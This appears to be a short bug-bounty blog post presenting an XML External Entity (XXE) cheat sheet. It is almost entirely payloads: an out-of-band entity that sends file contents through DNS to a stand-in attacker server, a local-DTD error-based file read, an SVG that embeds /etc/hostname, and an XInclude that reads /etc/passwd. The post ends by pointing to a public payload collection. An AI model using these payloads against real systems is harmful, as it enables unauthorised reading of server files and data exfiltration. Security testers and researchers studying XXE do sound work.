---
layout: post
title:  "XXE_Cheat_sheet"
date:   2020-08-13 04:00 +0900
categories: Security
tags: [bugbountytip]
---

<br />
### XXE-OOB-Over-DNS
```
<!ENTITY % data SYSTEM "file:///tmp/foo">
<!ENTITY % url "<!ENTITY &#x25; exfil SYSTEM 'http://%data;.my.evil.server'>">
```
<br />
<br />

### XXE-Witch-Local_DTD(docbookx.dtd)
```
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
 <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
 <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
 &#x25;eval;
 &#x25;error;
 '>

    %local_dtd;
]>
<root></root>
```
<br />
<br />

### XXE-inside-SVG
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
<br />
<br />

### XXE-Xinclude
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
<br />
<br />
<br />

ref) 
Usually does tricks work for me. but, try other way ins't hurt us, right? :)

[allthegoodthing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-apache-karaf)
:)


